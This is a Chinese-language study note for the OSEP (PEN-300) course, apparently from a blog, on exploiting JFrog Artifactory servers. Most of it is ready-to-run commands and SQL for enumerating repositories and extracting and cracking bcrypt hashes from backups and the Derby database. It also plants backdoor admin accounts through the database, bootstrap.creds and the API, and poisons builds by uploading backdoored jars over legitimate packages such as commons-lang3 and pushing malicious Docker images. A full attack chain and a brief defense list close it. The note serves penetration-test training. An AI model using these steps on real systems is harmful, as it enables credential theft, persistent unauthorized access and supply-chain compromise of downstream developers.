---
title: OSEP-11-Artifactory利用
description: '11-Linux后渗透 | 06-Artifactory利用'
pubDate: 2026-01-30T00:01:56+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Linux Machine
---

# Artifactory利用技术

## 1. Artifactory基础概念

### 什么是Artifactory
```
JFrog Artifactory是一个二进制仓库管理器:
├── 存储和管理软件包、Docker镜像、Maven依赖等
├── 企业DevOps环境中广泛使用
├── 可能包含敏感的构建产物和凭证
├── 默认端口: 8081 (HTTP), 8082 (HTTPS)
└── 管理界面: http://target:8081/artifactory
```

### Artifactory架构
```
Artifactory Server
    │
    ├── 本地仓库 (Local Repositories)
    │   └── 存储内部构建产物
    ├── 远程仓库 (Remote Repositories)
    │   └── 代理外部仓库
    ├── 虚拟仓库 (Virtual Repositories)
    │   └── 聚合多个仓库
    └── 数据库
        └── Derby (默认) 或 PostgreSQL/MySQL
```

---

## 2. Artifactory枚举

### 发现Artifactory服务
```bash
# 端口扫描
nmap -p 8081,8082 target

# 访问Web界面
curl http://target:8081/artifactory/

# 检查API
curl http://target:8081/artifactory/api/system/ping
```

### 匿名访问检查
```bash
# 检查是否允许匿名访问
curl http://target:8081/artifactory/api/repositories

# 列出仓库
curl http://target:8081/artifactory/api/repositories -u anonymous:

# 搜索构建产物
curl "http://target:8081/artifactory/api/search/artifact?name=*.jar"
```

### 版本信息收集
```bash
# 获取系统信息
curl http://target:8081/artifactory/api/system/version

# 获取存储信息
curl http://target:8081/artifactory/api/storageinfo
```

---

## 3. 备份文件利用

### 查找备份文件
```bash
# 常见备份位置
/var/opt/jfrog/artifactory/backup/
/opt/jfrog/artifactory/var/backup/
/opt/jfrog/artifactory/var/backup/access/  # 用户数据库备份
$ARTIFACTORY_HOME/backup/

# 备份文件命名模式
artifactory.backup.*.zip
artifactory-config-*.xml
access.backup.*.json  # 用户数据库JSON备份
```

### 从JSON备份提取凭证
```bash
# 查看JSON备份文件
cat /opt/jfrog/artifactory/var/backup/access/access.backup.20200730120454.json

# JSON备份包含用户信息和bcrypt哈希
# 示例内容:
# {
#     "username" : "developer",
#     "email" : "developer@corp.local",
#     "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
#     ...
# }
```

### 破解bcrypt哈希
```bash
# 提取bcrypt哈希到文件
# 格式: $2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm

# 使用John the Ripper破解
john --wordlist=/usr/share/wordlists/rockyou.txt derbyhash.txt

# 使用hashcat破解 (模式3200为bcrypt)
hashcat -m 3200 derbyhash.txt /usr/share/wordlists/rockyou.txt
```

### 备份文件内容
```
备份文件通常包含:
├── etc/ - 配置文件
│   ├── artifactory.config.xml
│   ├── security.xml
│   └── db.properties
├── data/ - 数据文件
│   └── derby/ - Derby数据库
└── repositories/ - 仓库数据
```

### 提取备份
```bash
# 解压备份文件
unzip artifactory.backup.20200401.zip -d /tmp/backup/

# 查看配置文件
cat /tmp/backup/etc/artifactory.config.xml

# 查看安全配置
cat /tmp/backup/etc/security/artifactory.key
```

---

## 4. 数据库利用

### Derby数据库访问
```bash
# Derby数据库位置
/var/opt/jfrog/artifactory/data/derby/
$ARTIFACTORY_HOME/data/derby/

# 使用ij工具连接
java -jar derbyrun.jar ij
ij> connect 'jdbc:derby:/path/to/derby';
```

### 提取用户凭证
```sql
-- 查看用户表
SELECT * FROM access_users;

-- 查看密码哈希
SELECT username, password FROM access_users;

-- 查看API密钥
SELECT * FROM access_tokens;
```

### 密码哈希格式
```
Artifactory密码哈希格式:
├── 旧版本: bcrypt
├── 新版本: SHA-256 + salt
└── 可以使用hashcat或john破解
```

---

## 5. 添加后门管理员

### 通过数据库添加用户
```sql
-- 插入新管理员用户
INSERT INTO access_users (username, password, admin, enabled)
VALUES ('backdoor', '$2a$08$...', true, true);

-- 或修改现有用户权限
UPDATE access_users SET admin = true WHERE username = 'guest';
```

### 通过bootstrap.creds添加用户
```bash
# bootstrap.creds文件位置
$ARTIFACTORY_HOME/etc/security/bootstrap.creds

# 文件格式
admin@*=password

# 添加后门用户
echo "backdoor@*=P@ssw0rd123" >> bootstrap.creds

# 重启Artifactory使配置生效
systemctl restart artifactory
```

### 通过API添加用户
```bash
# 使用管理员凭证创建用户
curl -X PUT "http://target:8081/artifactory/api/security/users/backdoor" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "name": "backdoor",
    "email": "backdoor@evil.com",
    "password": "P@ssw0rd123",
    "admin": true
  }'
```

---

## 6. 敏感信息收集

### 搜索敏感文件
```bash
# 搜索配置文件
curl "http://target:8081/artifactory/api/search/artifact?name=*.properties"
curl "http://target:8081/artifactory/api/search/artifact?name=*.xml"
curl "http://target:8081/artifactory/api/search/artifact?name=*.yml"

# 搜索密钥文件
curl "http://target:8081/artifactory/api/search/artifact?name=*.key"
curl "http://target:8081/artifactory/api/search/artifact?name=*.pem"
```

### 下载敏感文件
```bash
# 下载特定文件
curl -O "http://target:8081/artifactory/repo/path/to/file.jar"

# 使用认证下载
curl -u user:password -O "http://target:8081/artifactory/repo/path/to/file"
```

### 检查构建信息
```bash
# 获取构建信息
curl "http://target:8081/artifactory/api/build"

# 构建信息可能包含:
# - 环境变量
# - 构建参数
# - 凭证信息
```

---

## 7. API密钥利用

### 获取API密钥
```bash
# 从数据库提取
SELECT * FROM access_tokens;

# 从配置文件提取
grep -r "apiKey" /opt/jfrog/artifactory/

# 从备份提取
grep -r "apiKey" /tmp/backup/
```

### 使用API密钥
```bash
# 使用API密钥认证
curl -H "X-JFrog-Art-Api: AKCp5..." "http://target:8081/artifactory/api/repositories"

# 上传恶意文件
curl -H "X-JFrog-Art-Api: AKCp5..." \
  -T malicious.jar \
  "http://target:8081/artifactory/libs-release/com/evil/malicious/1.0/malicious-1.0.jar"
```

---

## 8. 供应链攻击

### 替换合法包
```bash
# 上传恶意版本的合法包
curl -u admin:password \
  -T malicious-library-1.0.jar \
  "http://target:8081/artifactory/libs-release/com/company/library/1.0/library-1.0.jar"
```

### 投毒攻击
```bash
# 上传带后门的依赖
# 当开发者下载依赖时会执行恶意代码

# Maven示例
curl -u admin:password \
  -T backdoored-commons-1.0.jar \
  "http://target:8081/artifactory/libs-release/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar"
```

### Docker镜像投毒
```bash
# 推送恶意Docker镜像
docker tag malicious:latest target:8082/docker-local/legitimate:latest
docker push target:8082/docker-local/legitimate:latest
```

---

## 9. 权限提升

### 利用弱权限
```bash
# 检查文件权限
ls -la /opt/jfrog/artifactory/
ls -la /var/opt/jfrog/artifactory/

# 如果有写权限，可以修改配置
# 或替换二进制文件
```

### 利用服务账户
```bash
# Artifactory通常以专用用户运行
ps aux | grep artifactory

# 检查服务账户权限
id artifactory

# 可能有访问其他系统的权限
```

---

## 10. 实战示例

### 完整攻击流程
```bash
# 1. 发现Artifactory
nmap -p 8081,8082 target
curl http://target:8081/artifactory/api/system/ping

# 2. 枚举仓库
curl http://target:8081/artifactory/api/repositories

# 3. 查找备份文件
find / -name "artifactory.backup*" 2>/dev/null

# 4. 提取备份
unzip artifactory.backup.zip -d /tmp/backup/

# 5. 访问Derby数据库
java -jar derbyrun.jar ij
ij> connect 'jdbc:derby:/tmp/backup/data/derby';
ij> SELECT * FROM access_users;

# 6. 添加后门用户
echo "backdoor@*=P@ssw0rd123" >> /opt/jfrog/artifactory/etc/security/bootstrap.creds

# 7. 重启服务
systemctl restart artifactory

# 8. 使用后门登录
curl -u backdoor:P@ssw0rd123 http://target:8081/artifactory/api/system/ping
```

---

## 常用命令速查

| 命令 | 说明 |
|------|------|
| `curl .../api/system/ping` | 检查服务状态 |
| `curl .../api/repositories` | 列出仓库 |
| `curl .../api/system/version` | 获取版本信息 |
| `curl .../api/search/artifact?name=*` | 搜索构建产物 |
| `curl .../api/security/users` | 列出用户 |
| `curl -T file .../repo/path` | 上传文件 |
| `curl -O .../repo/path/file` | 下载文件 |

---

## 防御建议

```
1. 禁用匿名访问
2. 使用强密码和API密钥
3. 限制网络访问
4. 定期审计用户和权限
5. 加密备份文件
6. 监控异常活动
7. 及时更新补丁
8. 使用HTTPS
9. 实施最小权限原则
10. 定期轮换凭证
```
